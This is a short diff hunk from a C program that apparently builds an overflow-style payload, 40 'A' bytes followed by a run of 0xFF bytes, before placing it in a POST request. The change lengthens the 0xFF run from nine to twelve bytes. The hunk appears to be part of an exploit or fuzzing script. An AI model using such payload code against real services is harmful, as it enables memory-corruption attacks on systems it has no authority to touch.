@@ -32,7 +32,7 @@ int main() {
 
     char payload[150] = {0};
     memset(payload, 'A', 40);
-    strcat(payload, "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF");
+    strcat(payload, "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF");
 
 
     char post_request[512];
